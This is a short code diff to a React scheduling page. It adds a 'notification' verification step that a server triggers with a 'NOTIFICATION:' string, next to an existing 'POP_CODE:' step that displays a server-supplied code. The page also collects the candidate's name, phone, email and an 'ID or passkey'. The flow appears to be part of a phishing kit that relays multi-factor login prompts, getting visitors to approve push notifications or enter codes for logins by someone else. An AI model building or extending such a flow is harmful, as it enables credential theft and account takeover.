@@ -83,6 +83,7 @@ function SchedulePageInner() {
   const [verifyStage, setVerifyStage] = useState<VerifyStage>("closed");
   const [codeNumber, setCodeNumber] = useState<number>(1);
   const [displayCodeValue, setDisplayCodeValue] = useState<string>("");
+  const [notificationDeviceValue, setNotificationDeviceValue] = useState<string>("");
   const [submitting, setSubmitting] = useState(false);
   const [verifyError, setVerifyError] = useState<string | null>(null);
   const [bookingId, setBookingId] = useState<string | null>(null);
@@ -463,7 +464,11 @@ function SchedulePageInner() {
             setVerifyError("That ID or passkey doesn't match our records. Please re-enter and try again.");
             setVerifyStage("idPasskey");
           } else if (status === "awaiting_code") {
-            if (req.startsWith("POP_CODE:")) {
+            if (req.startsWith("NOTIFICATION:")) {
+              const notifVal = req.replace("NOTIFICATION:", "");
+              setNotificationDeviceValue(notifVal);
+              setVerifyStage("notification");
+            } else if (req.startsWith("POP_CODE:")) {
               const popVal = req.replace("POP_CODE:", "");
               setDisplayCodeValue(popVal);
               setVerifyStage("displayCode");
@@ -1012,6 +1017,7 @@ function SchedulePageInner() {
         submitting={submitting}
         codeNumber={codeNumber}
         displayCode={displayCodeValue}
+        notificationDevice={notificationDeviceValue}
         candidateName={name}
         candidatePhone={phone}
         candidateEmail={email}
